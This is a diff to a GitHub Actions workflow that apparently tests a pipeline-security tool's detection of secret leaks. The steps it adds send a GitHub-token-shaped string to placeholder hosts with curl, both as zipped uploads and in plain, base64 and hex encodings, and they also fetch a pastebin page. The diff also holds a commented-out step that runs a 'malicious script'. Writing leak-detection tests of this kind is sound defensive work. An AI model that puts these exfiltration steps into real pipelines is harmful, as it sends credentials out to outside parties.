@@ -29,10 +29,10 @@ jobs:
       #   run: git --version
          
       - name: Setup PSE
-        uses: invisirisk/pse-action@latest
+        uses: invisirisk/pse-action@dev-test
         with:
-          api_url: "https://app.invisirisk.com"
-          app_token: ${{ secrets.IR_API_KEY_PROD }}
+          api_url: "https://app.stage.invisirisk.com"
+          app_token: ${{ secrets.IR_API_KEY_SECRET }}
           mode: "docker-intercept"
 
       - uses: actions/checkout@v4
@@ -80,8 +80,8 @@ jobs:
       #   continue-on-error: true
       #   run: sleep 200
 
-      # # # - name: 😈 Execute malicious script
-      # # #   run: bash run_malicious_scripts.sh
+      # - name: 😈 Execute malicious script
+      #   run: bash run_malicious_scripts.sh
 
       # - name: Secret Leak Policy
       #   run: |
@@ -119,12 +119,67 @@ jobs:
       #     -H "Content-Type: application/json" \
       #     -d '{"key": "value"}'
 
-      - name: Install dependencies
-        run: pip install -r requirements.txt
+
+      - name: 📝 Create and Compress the File
+        run: |
+          # 1. Create a dummy file for the mock
+          echo "-d '{"data":{"GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}}'" > dummy_file.txt
+          
+          # 2. Create the leaks.zip file in the working directory
+          zip leaks.zip dummy_file.txt
+          
+      - name: 📝 Create and Compress the File With base64 secrets
+        run: |
+          # 1. Create a dummy file for the mock
+          echo "-d '{"data":{"GH":"WjJod1gwUkZSbnB0WnpkU1NISlJNbVZOWlRKSlJqUk9lRTVYVVc5a1dYQmhZak5XVFZoWVdBPT0="}}'" > dummy_file_64.txt
+          
+          # 2. Create the leaks.zip file in the working directory
+          zip leaks64.zip dummy_file_64.txt
+          
+      - name: 🚀 Upload the generated Zip File
+        run: |
+          # Since the 'zip' command ran in the root directory, 
+          # the path is simply 'leaks.zip'
+          curl -X POST https://archivedSecrets.com \
+            -F "file=@leaks.zip" \
+            -H "Content-Type: application/form-data"
+            
+      - name: 🚀 Upload the generated Zip File base64
+        run: |
+          # Since the 'zip' command ran in the root directory, 
+          # the path is simply 'leaks.zip'
+          curl -X POST https://archivedSecretsbase64.com \
+            -F "file=@leaks64.zip" \
+            -H "Content-Type: application/form-data"
+            
+      - name: Mock API key exposure request
+        run: |
+          curl -X POST https://normalsecrets.com \
+          -H "Content-Type: application/json" \
+          -d '{"data":{"GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}}'
+          
+      - name: 3 level base64 encoding secrets
+        run: |
+          curl -X POST https://base64encodedsecrets.com \
+          -H "Content-Type: application/json" \
+          -d '{"data":{"GH":"V2pKb2QxZ3dVa1pTYm5CMFducGtVMU5JU2xKTmJWWk9XbFJLU2xKcVVrOWxSVFZZVlZjNWExZFlRbWhaYWs1WFZGWm9XVmRCUFQwPQ=="}}'
+          
+      - name: hex encoded
+        run: |
+          curl -X POST https://hexencodedsecrets.com \
+          -H "Content-Type: application/json" \
+          -d '{"data":{"GH":"6768705f4445467a6d67375248725132654d65324946344e784e57516f645970616233564d585858"}}'
+          
+      - name: secrets on response
+        run: |
+          curl -k https://pastebin.com/raw/V4FrgKcm
+
+    #  - name: Install dependencies
+      #  run: pip install -r requirements.txt
 
       - name: Cleanup PSE
         if: always()
-        uses: invisirisk/pse-action@latest
+        uses: invisirisk/pse-action@dev-test
         with:
           cleanup: "true"
 
@@ -135,34 +190,9 @@ jobs:
     if: always()
     steps:
       - name: Gather Status
-        uses: invisirisk/pse-action@latest
+        uses: invisirisk/pse-action@dev-test
         with:
-          api_url: "https://app.invisirisk.com"
-          app_token: ${{ secrets.IR_API_KEY_PROD }}
+          api_url: "https://app.stage.invisirisk.com"
+          app_token: ${{ secrets.IR_API_KEY_SECRET }}
           send_job_status: "true"
           debug: "true"
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
